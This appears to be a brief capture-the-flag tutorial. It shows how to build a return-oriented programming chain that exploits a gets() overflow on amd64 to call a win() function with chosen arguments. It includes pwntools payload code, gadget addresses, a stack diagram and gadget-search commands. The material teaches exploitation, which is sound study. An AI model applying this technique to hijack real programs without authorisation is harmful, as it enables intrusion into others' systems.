You must call win(a, b) with specific arguments
On amd64 (Linux):
- 1st argument → rdi
- 2nd argument → rsi

You control:
```
gets(buffer);
```

So you can overwrite return address. But you cannot directly set registers like rdi, rsi.

The solution: ROP gadgets. You use existing assembly snippets (gadgets) like:
```
pop rdi
ret
```
This means “Take next value from stack → put it into rdi”

Set rdi = 0xdeadbeef
```python
payload += p64(0x486143)   # pop rdi; pop rbp; ret
payload += p64(0xdeadbeef)
payload += b"B" * 8        # rbp (ignored)
```
Stack becomes:
```
[ gadget addr ] → executed
[ 0xdeadbeef ] → goes into rdi
[ junk ]       → goes into rbp
```

Set rsi = 0xbadc0de
```python
payload += p64(0x00486141) # pop rsi; pop r15; pop rbp; ret
payload += p64(0xbadc0de)
payload += b"C"*8   # r15
payload += b"D"*8   # rbp
```

Why extra pops?
Example:
```
pop rsi
pop r15
pop rbp
ret
```
You MUST provide values for ALL pops:
```python
p64(value_for_rsi)
p64(junk_for_r15)
p64(junk_for_rbp)
```

Visual stack layout after overflow:
```
[ pop rdi gadget ]
[ 0xdeadbeef     ] → rdi
[ junk (rbp)     ]

[ pop rsi gadget ]
[ 0xbadc0de      ] → rsi
[ junk (r15)     ]
[ junk (rbp)     ]

[ win() address  ]
```
How you find gadgets?
Using tools:
```shell
ROPgadget --binary ./main | grep "pop rdi"
ROPgadget --binary ./main | grep "pop rsi"
```
or pwntools
```shell
 python3 -c "from pwn import *; rop = ROP('./main'); print(rop.gadgets)" | grep "pop rdi"
```